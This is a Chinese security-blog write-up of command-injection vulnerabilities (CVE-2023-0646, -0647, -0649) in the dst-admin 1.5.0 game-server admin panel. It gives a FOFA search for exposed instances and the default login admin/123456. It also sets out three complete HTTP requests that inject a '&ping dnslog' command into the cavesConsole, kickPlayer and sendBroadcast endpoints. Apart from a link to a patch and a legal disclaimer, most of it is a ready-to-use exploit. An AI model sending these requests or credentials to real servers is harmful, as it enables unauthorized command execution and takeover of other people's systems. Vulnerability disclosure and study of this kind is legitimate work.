#  dst-admin饥荒管理后台相关漏洞合集   
无问  巢安实验室   2024-04-07 21:30  
  
### 0x01 产品简介  
  
dst-admin饥荒管理后台是qinming99个人开发者的一个用 Java 语言编写的 web 程序。  
### 0x02 漏洞概述  
  
dst-admin饥荒管理后台kickPlayer、cavesConsole、sendBroadcast等接口处配置不当，导致破解口令后的攻击者可以进行命令注入，获取服务器权限。  
### 0x03 影响范围  
  
dst-admin 1.5.0版本  
### 0x04 复现环境  
  
FOFA：title=="饥荒管理后台"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yFwRNdygAQAl5gebX6zl0oiajhWqTMkmNolU3TqMMpuFrg5FPGQMZHJBg/640?wx_fmt=png&from=appmsg "")  
### 0x05 漏洞复现  
  
**弱口令登录**  
  
admin/123456  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yFDic8smf6XfCOWRljialXoKFSMtbicySictJhAFXb4icNTZVPUxEcMlic8I2g/640?wx_fmt=png&from=appmsg "")  
  
**CVE-2023-0646**  
```
POST /home/cavesConsole HTTP/1.1
Host: your-ip
Content-Type: application/json
Cookie: JSESSIONID=65b0f393-708f-4e03-b564-52b1bc0b683a;rememberMe=deleteMe;
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"command":"\"&ping Dnslog;\""}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yFzcEUwRiaYoSZUDjCIU8AvUygpwubuGo8QA66uXhMlNJmu9YZuiaHRQwQ/640?wx_fmt=png&from=appmsg "")  
  
**CVE-2023-0647**  
```
GET /home/kickPlayer?userId=%5C%22)%5Cn%22%26ping+Dnglog%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22 HTTP/1.1
Host: your-ip
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cookie: JSESSIONID=93ab200b-a15d-4ac6-8138-abfa1262b5f5;rememberMe=deleteMe;
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yFNjRwj8jnoOKiaJHGe6QozmblefCv0mqm493DdzlOCFHvo1icYR367VIA/640?wx_fmt=png&from=appmsg "")  
  
**CVE-2023-0649**  
```
GET /home/sendBroadcast?message=%5C%22)%5Cn%22%26ping+dnslog%26screen%20-S%20%22DST_CAVES%22%20-p%200%20-X%20stuff%20%22TheNet%3AKick(%5C%22 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cookie: JSESSIONID=94d5d20b-036a-41bf-a77c-334d2be0ed80;rememberMe=deleteMe;
Accept-Encoding: gzip
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yF8bovG17ZC7z2lrKt2M27icibkzum7sSE2gNicjOYwial6ia4vtwBv9SnFDA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVyPVX9gy9giaMWnoxGnR76yFI4CfLNtOhvn3dTLprwtACscm1Vv3IglOTpDpISEg0TkvENAwhlClOQ/640?wx_fmt=jpeg "")  
### 0x06 修复建议  
  
目前厂商已发布升级补丁以修复漏洞，  
  
补丁获取链接：https://github.com/qinming99/dst-admin  
  
参考链接  
```
https://blog.csdn.net/qq_41904294/article/details/134636492
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVzNPDEiadhLROCQUuMQyouq2OicjCbTSbk6ZLyzR1uHhPhJZLuZTFaM31tS5jvcDB3sfVsb9novFWeQ/640?wx_fmt=jpeg "")  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
